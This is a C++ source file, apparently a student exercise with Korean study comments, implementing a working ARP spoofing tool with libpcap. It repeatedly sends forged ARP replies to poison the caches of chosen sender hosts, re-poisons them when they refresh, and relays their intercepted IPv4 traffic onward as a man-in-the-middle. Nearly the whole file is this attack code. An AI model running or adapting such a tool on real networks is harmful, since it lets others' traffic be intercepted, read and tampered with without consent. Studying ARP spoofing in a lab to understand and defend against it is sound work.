#include <stdio.h>
#include <map>
#include <list>
#include <algorithm>
#include <thread>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>   //ifreq
#include <unistd.h>   //close
#include <stdlib.h>
#include <pcap.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"


#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct IpHdr{
    unsigned char IHL : 4; //  Header Length(4 bits), IP 헤더의 길이를 알 수 있는 필드가ㅄ *4 하면 헤더 길이가 나옴. 일반적으로는 20이지만, 고정은 아니라고 함.
    unsigned char Version : 4; // IPv4 or IPv6(4 bits) 버전 확인 와 이게 뭔지 몰랐는데 검색해보니 비트 필드라는 것이다. Nibble 단위를 써본 적이 없으니.. 대신, struct에서만 사용 가능한듯?
    unsigned char TOS; // 서비스 우선 순위라고 하는데 구조상 1 byte
    unsigned short TotalLen; // IP부터 패킷의 끝의 총 길이(2 bytes)
    unsigned short ID; // 분열이 발생 했을 때 원래 데이터를 식별하기 위해서 사용
    unsigned char FO1 : 5; // 저장된 원래 데이터의 바이트 범위를 나타soa, dkvdml 3 bits
    unsigned char Flagsx : 1; // 항상 0,
    unsigned char FlagsD : 1; // 0: 분열 가능, 1: 분열 방지
    unsigned char FlagsM : 1; // 0: 마지막 조각, 1: 조각 더 있음.
    unsigned char FO2; // enldml 8 bits
    unsigned char TTL; // 패킷이 너무 오래 있어서 버려야 하는지 여부, 이동 할때마다 -1 한다고 함. 테스트 해보자
    unsigned char Protocol; // 프로토콜 ^^
    unsigned short HeaderCheck; // ip header checksum.
    struct in_addr SrcAdd;
    struct in_addr DstAdd;
}IPH;

#pragma pack(push, 1)
struct EthIpPacket {
    EthHdr eth_;
    IpHdr ip_;
};
#pragma pack(pop)

bool loop = true;

struct arpspoof{
    std::list<Ip> sip;
    std::list<Ip> tip;
    std::list<Mac> smac;
    std::list<Mac> tmac;
};

struct th1_arg { // 쓰레드 인자 전달용 구조체 infectAll
    pcap_t* handle;
    struct arpspoof spoof;
    Mac amac;
};

struct th2_arg { // 쓰레드 인자 전달용 구조체 receivePacket
    pcap_t* handle;
    struct arpspoof spoof;
    Mac amac;
    Ip aip;
};

int sendPacket(pcap_t* handle, EthArpPacket packet);
int sendPacket(pcap_t* handle, u_char* packet, int size);
Mac getMacAddress(char* iface);
char* getIPAddress(char* iface);
Mac getMacAddressFromPacket(pcap_t* handle);
void printInfo(struct arpspoof &spoof);
void makeARPTable(pcap_t* handle, struct arpspoof &spoof, Mac amac, Ip aip);
//void receivePacket(void* args);
void receivePacket(pcap_t* handle, struct arpspoof &spoof, Mac amac, Ip aip);
void replyPacket(pcap_t *handle, const u_char* packet, Mac smac, Mac tmac, int size);
//void infectAll(void* args);
void infectAll(pcap_t* handle, struct arpspoof &spoof, Mac amac);
EthArpPacket makeArpRequestPacket(Mac smac, Ip sip, Ip tip);
EthArpPacket makeArpReplyPacket(Mac smac, Mac tmac, Ip sip, Ip tip);
//void turnOff();

int main(int argc, char* argv[]) {
    if(argc < 4 || argc % 2 != 0)
    {
        printf("[?] syntax: %s <interface> <sender ip> <target ip> [<sender ip2> <target ip 2>...]\n", argv[0]);
        printf("[?] sample: %s wlan0 10.1.1.3 10.1.1.1 10.1.1.1 10.1.1.3\n", argv[0]);
        return -1;
    }

    char* dev = argv[1];

    struct arpspoof spoof;


    std::map<Mac,Mac> mtable; // checking route

    Mac amac = getMacAddress(dev);
    Ip aip = Ip(getIPAddress(dev));

    for(int i = 2; i < argc - 1; i += 2)
    {
        spoof.sip.push_back(Ip(argv[i]));
        spoof.tip.push_back(Ip(argv[i+1]));
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "[!] couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    printf("[*] Get IP, MAC about senders, targets\n");
    makeARPTable(handle, spoof, amac, aip);
    printInfo(spoof); // 구한 정보들 출력

    //std::thread t1(infectAll, handle, std::ref(spoof), amac);
    //std::thread t2(receivePacket, handle, std::ref(spoof), amac, aip);

    std::thread* t1 = new std::thread(infectAll, handle, std::ref(spoof), amac);
    std::thread* t2 = new std::thread(receivePacket, handle, std::ref(spoof), amac, aip);

    //infectAll(handle, spoof, amac);

    //std::thread* t1 = new std::thread(turnOff);
    //receivePacket(handle, spoof, amac, aip);

    char input;
    while(loop)
    {
        scanf("%c", &input);
        if(input == 'q')
            loop = false;
    }
    t1->join();
    t2->join();
    pcap_close(handle);
}

void makeARPTable(pcap_t* handle, struct arpspoof &spoof, Mac amac, Ip aip) // Call by reference
{
    EthArpPacket packet;
    std::list<Ip>::iterator sip_iter, tip_iter;

    for(sip_iter = spoof.sip.begin(), tip_iter = spoof.tip.begin(); sip_iter != spoof.sip.end(); sip_iter++, tip_iter++)
    {
        Mac smac, tmac;
        packet = makeArpRequestPacket(amac, aip, *sip_iter);
        sendPacket(handle, packet);
        smac = getMacAddressFromPacket(handle);
        packet = makeArpRequestPacket(amac, aip, *tip_iter);
        sendPacket(handle, packet);
        tmac = getMacAddressFromPacket(handle);

        spoof.smac.push_back(smac);
        spoof.tmac.push_back(tmac);
    }
}

void turnOff()
{
    char input;
    while(loop)
    {
        scanf("%c", &input);
        if(input == 'q')
            loop = false;
    }
}

void infectAll(pcap_t* handle, struct arpspoof &spoof, Mac amac)
{
    while(loop)
    {
        std::list<Ip>::iterator sip_iter, tip_iter; // iterator for exploring list
        std::list<Mac>::iterator smac_iter = spoof.smac.begin();
        for(sip_iter = spoof.sip.begin(), tip_iter = spoof.tip.begin(); sip_iter != spoof.sip.end(); sip_iter++, tip_iter++, smac_iter++) // infecting all
        {
            sendPacket(handle, makeArpReplyPacket(amac, *smac_iter, *tip_iter, *sip_iter));
        }
        sleep(10);
    }
}

void receivePacket(pcap_t* handle, struct arpspoof &spoof, Mac amac, Ip aip)
{
    struct pcap_pkthdr* header;
    const u_char* packet;
    EthArpPacket* arp_pack;
    EthIpPacket* ip_pack;

    while(loop)
    {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        ip_pack = (EthIpPacket*)packet;
        if(Ip(inet_ntoa(ip_pack->ip_.SrcAdd)) == aip || Ip(inet_ntoa(ip_pack->ip_.DstAdd)) == aip) continue; //나한테 오는건 거르기

        if(ip_pack->eth_.type_ == htons(EthHdr::Arp)) // ARP
        {
            arp_pack = (EthArpPacket*)packet;
            if(arp_pack->arp_.tmac_ == Mac("ff:ff:ff:ff:ff:ff") || arp_pack->arp_.op_ == ArpHdr::Reply) // ReInfect
            {
                sendPacket(handle, makeArpReplyPacket(amac, arp_pack->arp_.smac_, aip, arp_pack->arp_.sip_));
                printf("[*] Send ARP Packet %s(%s) -> %s(%s)\n", std::string(aip).c_str(), std::string(amac).c_str(), std::string(arp_pack->arp_.sip()).c_str(), std::string(arp_pack->arp_.smac_).c_str());
            }
            else if(arp_pack->arp_.op_ == ArpHdr::Request) // 그냥 ARP 확인 패킷인 경우
            {
                sendPacket(handle, makeArpReplyPacket(amac, arp_pack->arp_.smac_, aip, arp_pack->arp_.sip_));
                printf("[*] Send ARP Packet %s(%s) -> %s(%s)\n", std::string(aip).c_str(), std::string(amac).c_str(), std::string(arp_pack->arp_.sip_).c_str(), std::string(arp_pack->arp_.smac_).c_str());
            }
        }

        if(ip_pack->eth_.type_ == htons(EthHdr::Ip4)) // IPv4
        {
            std::list<Ip>::iterator sip_iter; // iterator for exploring list
            std::list<Mac>::iterator smac_iter, tmac_iter = spoof.tmac.begin();

            for(sip_iter = spoof.sip.begin(), smac_iter = spoof.smac.begin(); sip_iter != spoof.sip.end(); sip_iter++, smac_iter++, tmac_iter++)
            {
                if(ip_pack->eth_.smac_ == *smac_iter)
                {
                    replyPacket(handle, packet, amac, *tmac_iter, header->caplen);
                    printf("[*] Reply %s(%s) -> %s(%s)\n", std::string(aip).c_str(), std::string(amac).c_str(), std::string(Ip(inet_ntoa(ip_pack->ip_.SrcAdd))).c_str(), std::string(*tmac_iter).c_str());
                }
            }
        }
    }

}

void printInfo(struct arpspoof &spoof)
{
    std::list<Ip>::iterator sip_iter, tip_iter;
    std::list<Mac>::iterator smac_iter = spoof.smac.begin(), tmac_iter = spoof.tmac.begin();
    for(sip_iter = spoof.sip.begin(), tip_iter = spoof.tip.begin(); sip_iter != spoof.sip.end(); sip_iter++, tip_iter++)
    {
        printf("[*] TO DO | %s(%s) -> %s(%s)\n", std::string(*sip_iter).c_str(), std::string(*smac_iter).c_str(), std::string(*tip_iter).c_str(), std::string(*tmac_iter).c_str());
        smac_iter++; tmac_iter++;
    }
}

int sendPacket(pcap_t* handle, EthArpPacket packet)
{
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "[!] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		exit(-1);
	}
	return res;
}

int sendPacket(pcap_t* handle, u_char* packet, int size)
{
    //int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), size);
    int res = pcap_sendpacket(handle, packet, size);
    if (res != 0) {
        fprintf(stderr, "[!] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
    return res;
}

void replyPacket(pcap_t* handle, const u_char* packet, Mac smac, Mac tmac, int size)
{
    u_char* reply =(u_char*)malloc(sizeof(char)*size);
    memcpy(reply, packet, sizeof(char)*size);
    EthHdr* ethhdr = (EthHdr*) reply;

    ethhdr->smac_ = smac;
    ethhdr->dmac_ = tmac;

    sendPacket(handle, reply, size);
    free(reply);
}

Mac getMacAddressFromPacket(pcap_t* handle)
{
	int res;
    //ETH* eth;
    //arphdr_t* arp_packet;
    EthArpPacket* pack;
    struct pcap_pkthdr* header;
    //unsigned char *mac = NULL;
    const u_char* packet;
    //char* ret;

	while(1) {
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("[!] pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        pack = (EthArpPacket*)packet;
        if(pack->eth_.type_ != htons(0x0806)) continue; // ARP Packet Type 0x0806
		
        Mac ret = (unsigned char*)pack->arp_.smac();
        //char* ret = (char*)malloc(sizeof(mac));
        //sprintf(ret, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X", arp_packet->sha[0], arp_packet->sha[1], arp_packet->sha[2], arp_packet->sha[3], arp_packet->sha[4], arp_packet->sha[5]);
        //sprintf(ret, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        //free(ret);
        return ret;
        break;
	}
    return nullptr;
}

Mac getMacAddress(char* iface)
{
    int fd;
    struct ifreq ifr;

    memset(&ifr, 0, sizeof(ifr));

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr)) {
        Mac ret = (unsigned char *)ifr.ifr_hwaddr.sa_data;
        //char* ret = (char*)malloc(sizeof(mac));
        //sprintf(ret, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        //close(fd);
        //free(ret);
        return ret;
    }

    return nullptr;
    close(fd);
    printf("[!] %s : No such Network Interface Card\n", iface);
    exit(-1);
}

char* getIPAddress(char *iface)
{
    int fd;
    struct ifreq ifr;
    char* aip = NULL;

    memset(&ifr, 0, sizeof(ifr));

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

    if (0 == ioctl(fd, SIOCGIFADDR, &ifr)) {
	    aip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
        close(fd);
        return aip;
    }

    close(fd);
    printf("[!] %s : No such Network Interface Card\n", iface);
    exit(-1);
}

EthArpPacket makeArpRequestPacket(Mac smac, Ip sip, Ip tip)
{
	EthArpPacket packet;

	// ARP REQUEST TO GATEWAY
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // BROADCAST MAC
    packet.eth_.smac_ = smac; // attacker MAC
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request); // REQUEST
	packet.arp_.smac_ = Mac(smac); // attacker MAC
    packet.arp_.sip_ = htonl(sip); // attacker ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // UNKNOWN MAC
    packet.arp_.tip_ = htonl(tip); // target ip

	return packet;
}

EthArpPacket makeArpReplyPacket(Mac smac, Mac tmac, Ip sip, Ip tip)
{
	EthArpPacket packet;

	// ARP REQUEST FOR ARP SPOOFING
    packet.eth_.dmac_ = tmac; // target MAC
    packet.eth_.smac_ = smac; // attacker MAC
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply); // Reply
    packet.arp_.smac_ = smac; // attacker MAC
    packet.arp_.sip_ = htonl(sip); // gateway ip
    packet.arp_.tmac_ = tmac; // target MAC
    packet.arp_.tip_ = htonl(tip); // target ip
    return packet;
}
